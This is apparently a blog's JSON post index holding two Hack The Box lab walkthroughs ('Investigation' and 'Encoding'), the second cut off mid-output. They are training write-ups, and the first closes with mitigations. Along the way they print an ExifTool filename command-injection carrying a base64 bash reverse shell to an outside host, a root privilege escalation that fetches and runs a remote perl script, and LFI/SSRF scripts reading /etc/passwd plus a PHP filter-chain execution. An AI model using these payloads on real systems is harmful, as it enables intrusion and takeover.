[
  
  {
    "title": "Hack The Box - Investigation",
    "url": "/posts/HackTheBox-Walkthrough-Investigation/",
    "categories": "HackTheBox",
    "tags": "Walkthrough, Hacking, HackTheBox, Medium, Machine",
    "date": "2023-04-22 00:00:00 +0800",
    





    
    "snippet": "In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it.  Room: Investigation  Difficulty: Medium ...",
    "content": "In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it.  Room: Investigation  Difficulty: Medium  URL: https://app.hackthebox.com/machines/Investigation  Author: DerezzedEnumerationI began the box by running Rustscan to look for open ports.$ rustscan -a target -- -A | tee rust.txt.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| || .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy           :: https://github.com/RustScan/RustScan : --------------------------------------üòµ https://admin.tryhackme.com[~] The config file is expected to be at \"/home/ehogue/.rustscan.toml\"[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.Open 10.10.11.197:22Open 10.10.11.197:80Host is up, received syn-ack (0.048s latency).Scanned at 2023-02-19 07:52:55 EST for 15sPORT   STATE SERVICE REASON  VERSION22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8CUW+gkrjaTI+EeIVcW/8kCM0oaKxGk63NkzFaKj8cgPfImUg8NbMX7xSoQR2DJP88LCJWpm/7KgYyHgaI4w29TRZTGFrv1MKoALQKO/6GDUxLtoHaSA1KrXph74L9eNp/Q/xAzmjfNqLL3qCAotSUZndEWV7C7EQYj73e88Rvw+bV8mQ0O+habEygGVEFuEgOJpN0e3YM3EJoxo1N5CVJMBUJ4Jb7FoYYckIAYTZTV3fuembGRoG0Lvw6YbIOYA8URxLqcBxsMSOkznhf219fl2KXiT9Y7505L/HAeWG4NW4LAuDereMuaUDe4vWEMHYx0KH7m3UuJ7zxcPqHU7K94KW8cZVNlWjoNPDKrPTEgPDfDRlUNpVRyE87DcBgOzNGNFJHYhj2K46RKtv+TO9MjYKvC+nXFSNgPkdFaCQcfpqd61FtaVsin5Ho/v1XfhqDG0d7N7uDM28zCmNVfnl9+MI0jpBmiFaH8V0ZjR7EZlkk+7Xb3bI2Kq3KVaif7s=|   256 274520add2faa73a8373d97c79abf30b (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG5ZpYGYsM/eNsAOYy3iQ9O7/OdK6q63GKK1bd2ZA5qhePdO+KJOOvgwxKxBXoJApVfBKV0oVn3ztPubO2mdp5g=|   256 4245eb916e21020617b2748bc5834fe0 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ4m4ta/VBtbCv+5FEPfydbXySZHyzU7ELt9lBsbjl5S80/tcp open  http    syn-ack Apache httpd 2.4.41|_http-title: Did not follow redirect to http://eforenzics.htb/| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel...Nmap done: 1 IP address (1 host up) scanned in 15.11 secondsTwo ports were open:  22 - SSH  80 - HTTPPort 80 was redirecting to ‚Äòhttp://eforenzics.htb/‚Äô so I added that to my hosts files. I used Feroxbuster to look for hidden files, and wfuzz to look for subdomains. They did not find anything interesting.File UploadI opened the website in a browser.The website was mostly static. Except for the ‚ÄòFree Services‚Äô page that allowed uploading files.I tried uploading an image to the site. The image was uploaded, and I was given a link to view an analysis report on the file.I clicked on the link. It took me to a page that displayed the file image‚Äôs metadata extracted with ExifTool.Seeing file uploads, I thought I might be able to get Local File Inclusion, but I was not able to access the uploaded files, just the text file with the ExifTool results.I tried adding PHP code to the image description, but it was not executed. I also tried to append commands after the file hoping they would be sent to the command line and executed. That also failed.I looked for known vulnerabilities in ExifTool version 12.37 and found one. I was trying to add commands at the end of the file name, but I had to add in at the beginning and end it with a pipe (|).I tried it by beginning with something simple. I could not run something like id because the output was not displayed. So I tried starting a web server and sending a file called wget 10.10.14.11 | with Burp Repeater.It worked.$ python -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.197 - - [19/Feb/2023 09:13:26] \"GET / HTTP/1.1\" 200 -Next, I went for a reverse shell. To minimize the risk of having issues with special characters, I started by base64 encoding my payload.$ echo 'bash  -i &gt;&amp; /dev/tcp/10.10.14.8/4444  0&gt;&amp;1  ' | base64YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0ICAwPiYxICAKThen I sent it in the filename.Content-Disposition: form-data; name=\"image\"; filename=\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0ICAwPiYxICAK | base64 -d | bash |\"Content-Type: application/x-phpI got my reverse shell.$ nc -klvnp 4444listening on [any] 4444 ...connect to [10.10.14.8] from (UNKNOWN) [10.10.11.197] 46926bash: cannot set terminal process group (959): Inappropriate ioctl for devicebash: no job control in this shellwww-data@investigation:~/uploads/1676816336$UserOnce connected to the server, I saw that a cronjobs was interacting with files in ‚Äò/usr/local/investigation‚Äô.www-data@investigation:~/html$ crontab -l...*/5 * * * * date &gt;&gt; /usr/local/investigation/analysed_log &amp;&amp; echo \"Clearing folders\" &gt;&gt; /usr/local/investigation/analysed_log &amp;&amp; rm -r /var/www/uploads/* &amp;&amp; rm /var/www/html/analysed_images/*I looked in the folder  and saw that it contained an email about Windows Event Logs.www-data@investigation:~/html$ ls /usr/local/investigation/'Windows Event Logs for Analysis.msg'   analysed_logwww-data@investigation:/usr/local/investigation$ file Windows\\ Event\\ Logs\\ for\\ Analysis.msg Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook MessageI downloaded the file to my machine to better investigate it. I installed MSGConvert to convert the email in a format that I could read. The message had an attachment. I save the base64 of the attachment in a file and decoded it, then unzipped the file in contained.$ msgconvert logs.msg$ vim logs.msg$ cat b64.txt | base64 -d &gt; evtx-logs.zip$ file evtx-logs.zipevtx-logs.zip: Zip archive data, at least v2.0 to extract, compression method=deflate$ mkdir logs$ cd logs$ unzip ../evtx-logs.zipArchive:  ../evtx-logs.zip  inflating: security.evtx$ file security.evtxsecurity.evtx: MS Windows 10-11 Event Log, version  3.2, 238 chunks (no. 237 in use), next record no. 20013The attached file contained the Windows Security Event Logs. This file is not human-readable, so I used evtxexport to extract the data in a text file.$ evtxexport security.evtx &gt; exported.txtThe extracted file contained 440k lines. I took a quick look at it, but there was too much to find anything. I made a quick search and found out that code 4625 was used for failed log-on events. I searched the file for this code and found one event with a password in it.Event identifier        : 0x00001211 (4625)Number of strings       : 21String: 1               : S-1-5-18String: 2               : EFORENZICS-DI$String: 3               : WORKGROUPString: 4               : 0x00000000000003e7String: 5               : S-1-0-0String: 6               : REDACTEDString: 7               :I used the password to connect as ‚Äòsmorton‚Äô and it worked.$ ssh smorton@targetThe authenticity of host 'target (10.10.11.197)' can't be established.ED25519 key fingerprint is SHA256:lYSJubnhYfFdsTiyPfAa+pgbuxOaSJGV8ItfpUK84Vw.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added 'target' (ED25519) to the list of known hosts.smorton@target's password:Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-137-generic x86_64)...smorton@investigation:~$ lsuser.txtsmorton@investigation:~$ cat user.txtREDACTEDRootTo get to root, I looked at what the user could run with sudo.smorton@investigation:~$ sudo -lMatching Defaults entries for smorton on investigation:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser smorton may run the following commands on investigation:    (root) NOPASSWD: /usr/bin/binarysmorton@investigation:~$ file /usr/bin/binary/usr/bin/binary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a703575c5c944bfcfea8a04f0aabaf0b4fa9f7cb, for GNU/Linux 3.2.0, not strippedsmorton@investigation:~$ sudo /usr/bin/binaryExiting...They could execute a binary. I tried running it, but it appeared to exit immediately. I downloaded the executable to my machine and opened it in Ghidra. I renamed a few variables and added comments to make the code readable.The binary needed two arguments, a URL and a file name. The file name needed to be ‚ÄúlDnxUysaQn‚Äù. It used curl to download from the given URL and save the content to the file specified. It then used perl to execute the file it downloaded.It created a small perl script on my machine to run bash and launched a web server to give access to the script.$ cat index.htmlsystem('/bin/bash -p')$ python -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...I ran the program giving it a URL that pointed to my machine and the expected file name.My web server got hit.10.10.11.197 - - [19/Feb/2023 10:41:08] \"GET / HTTP/1.1\" 200 -And I was root on the server.smorton@investigation:~$ sudo /usr/bin/binary 10.10.14.8 \"lDnxUysaQn\"Running...root@investigation:/home/smorton# whoamirootroot@investigation:/home/smorton# cd /rootroot@investigation:~# cat root.txtREDACTEDMitigationMaking that box safer would start by keeping tools up to date. The version of exiftool on the server is outdated and has a known vulnerability. A simple update would have prevented the RCE. Next, there were sensitive files readable by anyone on the server. The email contained security logs. It should not be left on a server for anyone to grab it.The last issue was with the binary that ran any code it downloaded as root. Something like this should probably not exists on a real server. Executing arbitrary code is dangerous, doing it as root is worst."
  },
  
  {
    "title": "Hack The Box - Encoding",
    "url": "/2023/04/HTB/Encoding",
    "categories": "",
    "tags": "Walkthrough, Hacking, HackTheBox, Medium, Machine",
    "date": "2023-04-15 00:00:00 +0800",
    





    
    "snippet": "This was a really fun box. I had to exploit two LFI vulnerabilities and PHP filters to get a foothold. Then exploit git configuration and systemd to escalate my privileges.  Room: Encoding  Difficu...",
    "content": "This was a really fun box. I had to exploit two LFI vulnerabilities and PHP filters to get a foothold. Then exploit git configuration and systemd to escalate my privileges.  Room: Encoding  Difficulty: Medium  URL: https://app.hackthebox.com/machines/Encoding  Author: kavigihanEnumerationI started by scanning for open ports.$ rustscan -a target -- -A | tee rust.txt.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| || .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy           :: https://github.com/RustScan/RustScan : --------------------------------------Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan[~] The config file is expected to be at \"/home/ehogue/.rustscan.toml\"[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.Open 10.10.11.198:22Open 10.10.11.198:80[~] Starting Script(s)[&gt;] Script to be run Some(\"nmap -vvv -p  \")[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 08:26 EST...Scanned at 2023-03-04 08:26:12 EST for 7sPORT   STATE SERVICE REASON  VERSION22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))|_http-title: HaxTables| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.52 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNSE: Script Post-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 08:26Completed NSE at 08:26, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 08:26Completed NSE at 08:26, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 08:26Completed NSE at 08:26, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.92 secondsPort 22 (SSH) and 80 (HTTP) were open. I also checked for UDP ports.$ sudo nmap -sU target -oN nmapUdp.txt[sudo] password for ehogue:Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 08:26 ESTNmap scan report for target (10.10.11.198)Host is up (0.049s latency).Not shown: 999 closed udp ports (port-unreach)PORT   STATE         SERVICE68/udp open|filtered dhcpcNmap done: 1 IP address (1 host up) scanned in 1019.01 secondsOnly DHCP was open.I did not see any redirects, but when I looked at the site, I saw that there was an API at ‚Äòapi.haxtables.htb‚Äô. I added ‚Äòhaxtables.htb‚Äô and ‚Äòapi.haxtables.htb‚Äô to my hosts file and scanned for other subdomains.$ wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -t30 --hw 137 -H \"Host:FUZZ.haxtables.htb\" \"http://haxtables.htb\"********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://haxtables.htb/Total requests: 5000=====================================================================ID           Response   Lines    Word       Chars       Payload=====================================================================000000051:   200        0 L      0 W        0 Ch        \"api\"000000177:   403        9 L      28 W       284 Ch      \"image\"000002700:   400        10 L     35 W       305 Ch      \"m.\"000002795:   400        10 L     35 W       305 Ch      \"ns2.cl.bellsouth.net.\"000002883:   400        10 L     35 W       305 Ch      \"ns1.viviotech.net.\"000002885:   400        10 L     35 W       305 Ch      \"ns2.viviotech.net.\"000003050:   400        10 L     35 W       305 Ch      \"ns3.cl.bellsouth.net.\"000004083:   400        10 L     35 W       305 Ch      \"quatro.oweb.com.\"000004082:   400        10 L     35 W       305 Ch      \"jordan.fortwayne.com.\"000004081:   400        10 L     35 W       305 Ch      \"ferrari.fortwayne.com.\"Total time: 0Processed Requests: 4973Filtered Requests: 4963Requests/sec.: 0It found ‚Äòimage.haxtables.htb‚Äô, I added it with the other domains.Main WebsiteI loaded the main website in a browser.The site allowed performing some transformations on strings and integers. There was also a section for images, but it was ‚ÄòComing soon‚Äô.The Encoding menu took us to the pages to modify strings or integers. The URLs of those pages were interesting: ‚Äòhttp://haxtables.htb/index.php?page=string‚Äô. They had a ‚Äòpage‚Äô parameter that looked like it could be vulnerable to Local File Inclusion (LFI). I tried a few things, but nothing worked. The code was validating the value passed in.APIThe API menu took me to the API documentation with some examples on how to use it. And a hint about the API supporting more features not exposed in the UI.  You can use our live API to make these convertions easier. There are some additional features which the API supports that our application doesn‚Äôt. This application itself uses the API internally as the backbone.I scanned the API for hidden endpoints.$ feroxbuster -u http://api.haxtables.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o feroxApi.txt -x php ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ü§ì                 ver: 2.7.3‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üéØ  Target Url            ‚îÇ http://api.haxtables.htb üöÄ  Threads               ‚îÇ 50 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] üí•  Timeout (secs)        ‚îÇ 7 ü¶°  User-Agent            ‚îÇ feroxbuster/2.7.3 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml üíæ  Output File           ‚îÇ feroxApi.txt üí≤  Extensions            ‚îÇ [php] üèÅ  HTTP methods          ‚îÇ [GET] üîÉ  Recursion Depth       ‚îÇ 4 üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ200      GET        0l        0w        0c http://api.haxtables.htb/403      GET        9l       28w      282c http://api.haxtables.htb/.php403      GET        9l       28w      282c http://api.haxtables.htb/.html403      GET        9l       28w      282c http://api.haxtables.htb/.htm403      GET        9l       28w      282c http://api.haxtables.htb/.html.php200      GET        0l        0w        0c http://api.haxtables.htb/index.php403      GET        9l       28w      282c http://api.haxtables.htb/.htm.php403      GET        9l       28w      282c http://api.haxtables.htb/.htaccess403      GET        9l       28w      282c http://api.haxtables.htb/.htaccess.php200      GET        0l        0w        0c http://api.haxtables.htb/utils.php301      GET        9l       28w      319c http://api.haxtables.htb/v2 =&gt; http://api.haxtables.htb/v2/403      GET        9l       28w      282c http://api.haxtables.htb/.phtml301      GET        9l       28w      319c http://api.haxtables.htb/v1 =&gt; http://api.haxtables.htb/v1/301      GET        9l       28w      319c http://api.haxtables.htb/v3 =&gt; http://api.haxtables.htb/v3/403      GET        9l       28w      282c http://api.haxtables.htb/.htc...403      GET        9l       28w      282c http://api.haxtables.htb/.html_files.php403      GET        9l       28w      282c http://api.haxtables.htb/.htmlpar.php403      GET        9l       28w      282c http://api.haxtables.htb/.htmlprint.php403      GET        9l       28w      282c http://api.haxtables.htb/.hts.php[####################] - 1m    504704/504704  0s      found:91      errors:0[####################] - 1m    126176/126176  1473/s  http://api.haxtables.htb/[####################] - 0s    126176/126176  0/s     http://api.haxtables.htb/v2/ =&gt; Directory listing (add -e to scan)[####################] - 0s    126176/126176  0/s     http://api.haxtables.htb/v1/ =&gt; Directory listing (add -e to scan)[####################] - 0s    126176/126176  0/s     http://api.haxtables.htb/v3/ =&gt; Directory listing (add -e to scan)There were 3 versions of the API, and they had directory listing available. V1 and V3 of the API had two endpoints.V2 was blocked, apparently it had security issues.{  \"message\": \"This resource is under construction and unavailable for public access due to security issues.!\"}I could not load it directly, but I quickly found out that I could get to it by modifying the POST request that the UI sent when I used the encoding functions. The UI was using v3, I just changed it to v2.POST /handler.php HTTP/1.1Host: haxtables.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/json;charset=UTF-8Origin: http://haxtables.htbConnection: keep-aliveReferer: http://haxtables.htb/index.php?page=stringContent-Length: 69{\"action\":\"hex2str\",\"data\":\"aaaaaaaaa\",\"uri_path\":\"/v2/tools/string\"}HTTP/1.1 200 OKDate: Sat, 04 Mar 2023 14:00:55 GMTServer: Apache/2.4.52 (Ubuntu)Vary: Accept-EncodingKeep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: text/html; charset=UTF-8Content-Length: 14{\"data\":false}I spent a lot of time trying to find the security issues in v2, but I did not find anything.LFIThe documentation showed that the API had a ‚Äòfile_url‚Äô parameter that allowed loading the data to convert from a URL instead of passing it directly. I tried to point the ‚Äòfile_url‚Äô to my machine, the server loaded the data from my machine. I tried redirecting it to another URL, but it did not appear to follow redirects.I also tried to get it to load version 2 of the API from version 3.json_data = {  'action': 'b64encode',  'file_url' : 'http://api.haxtables.htb/v2/tools/string/index.php'}response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)print(response.text)The URL was blocked.$ python test.py{\"message\":\"Unacceptable URL\"}Next, I tried to get it to load a file from the server.import requestsjson_data = {  'action': 'b64encode',  'file_url' : 'file:///etc/passwd'}response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)print(response.text)This worked.$ python test.py | jq \".data\" | tr -d '\"' | base64 -droot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:104::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinpollinate:x:105:1::/var/cache/pollinate:/bin/falsesshd:x:106:65534::/run/sshd:/usr/sbin/nologinsyslog:x:107:113::/home/syslog:/usr/sbin/nologinuuidd:x:108:114::/run/uuidd:/usr/sbin/nologintcpdump:x:109:115::/nonexistent:/usr/sbin/nologintss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/falselandscape:x:111:117::/var/lib/landscape:/usr/sbin/nologinusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsvc:x:1000:1000:svc:/home/svc:/bin/bashlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/falsefwupd-refresh:x:113:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin_laurel:x:998:998::/var/log/laurel:/bin/falseI modified the code to take the file to download as a parameter and used it to download all the source code I could find on the server.The code that was vulnerable was using curl to download the file.function get_url_content($url){  $domain = parse_url($url, PHP_URL_HOST);  if (gethostbyname($domain) === \"127.0.0.1\") {    jsonify([\"message\" =&gt; \"Unacceptable URL\"]);  }  $ch = curl_init();  curl_setopt($ch, CURLOPT_URL, $url);  curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);  curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);  $url_content =  curl_exec($ch);  curl_close($ch);  return $url_content;}I could not use it to get code execution. It was also validating the domain to try to prevent Server Side Request Forgery (SSRF).I also wrote a small script to look for other endpoints in v2.import requestsimport jsonfile = open('/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt', 'r')for line in file:    file_to_get = line.strip()    json_data = {        'action': 'b64encode',        'file_url' : f\"file:///var/www/api/v2/tools/{file_to_get}/index.php\"    }    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)    json_data = json.loads(response.text)    if (len(json_data['data']) &gt; 0):        print(file_to_get)It did not find anything new.More LFII tried looking at the site on ‚Äòimage.haxtables.htb‚Äô, but I was blocked. Looking at the Apache config I got through the LFI, I saw that only localhost was allowed to access it.&lt;VirtualHost *:80&gt;        ServerName image.haxtables.htb        ServerAdmin webmaster@localhost        \tDocumentRoot /var/www/image        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined\t#SecRuleEngine On...        &lt;Directory /var/www/image&gt;                Deny from all                Allow from 127.0.0.1                Options Indexes FollowSymLinks                AllowOverride All                Require all granted        &lt;/DIrectory&gt;&lt;/VirtualHost&gt;I used the LFI in the API to extract the code source for the image site. The code made it look like it was a git repository, so I extracted the .git folder also.I looked at the code, and I found another LFI vulnerability.&lt;?phpinclude_once 'utils.php';if (isset($_GET['page'])) {    $page = $_GET['page'];    include($page);} else {    echo jsonify(['message' =&gt; 'No page specified!']);}?&gt;This one used include to get the page without any validation. It would allow me to get code execution, but I was unable to access it.I went back to the code that loaded a URL in the API.function get_url_content($url){  $domain = parse_url($url, PHP_URL_HOST);  if (gethostbyname($domain) === \"127.0.0.1\") {    jsonify([\"message\" =&gt; \"Unacceptable URL\"]);  }  $ch = curl_init();  curl_setopt($ch, CURLOPT_URL, $url);  ...}The code was using parse_url to split the URL into parts, then gethostbyname to make sure the domain did not point to localhost, and finally curl to make the request.I needed to find something that would not resolve to localhost in PHP, but still work in curl. I searched for vulnerabilities in all those functions. I tried multiple things like adding null bytes, and carriage returns, ‚Ä¶The name of the box and its image pointed to UTF-8, so I also tried adding UTF characters at the beginning and the end, but it broke curl. I found the slide to a Black Hat presentation that had many things to try. And I finally got it. I needed to send a request to ‚Äòimage.haxtab‚ìõ‚ìîs.htb‚Äô. It did not resolve to localhost in PHP, but it worked in curl, and Apache sent the request to the correct vhost.I modified the LFI script to exploit the second LFI.#!/usr/bin/env pythonimport requestsimport sysimport jsonimport base64json_data = {    'action': 'b64encode',    'file_url' : \"http://image.haxtab‚ìõ‚ìîs.htb/actions/action_handler.php?page=/etc/passwd\"}response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)json_data = json.loads(response.text)if 'data' not in json_data:    print('Failed')    print(json_data)    exit()decoded = base64.b64decode(json_data['data']).decode()print(decoded)$ ./imageLFI.pyroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologin...It worked. I then tried to get a file from my machine.'file_url' : \"http://image.haxtab‚ìõ‚ìîs.htb/actions/action_handler.php?page=http://10.10.14.8/rce.php\"This failed. allow_url_include must have been disabled.I spent a lot of time trying to find PHP file to include that would allow me to run arbitrary code. Or find a way to write a file on the server. I did not find any.Then I remembered the PHP Filter Chain technique. I cloned the generator repository to my machine and tried a simple command.$ python3 php_filter_chain_generator.py --chain '&lt;?php echo `id`; ?&gt;'[+] The following gadget chain will generate the following code : &lt;?php echo `id`; ?&gt; (base64 value: PD9waHAgZWNobyBgaWRgOyA/Pg)php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7 ... =php://tempI used this filter chain as the page payload.$ ../imageLFI.py                                                     b'uid=33(www-data) gid=33(www-data) 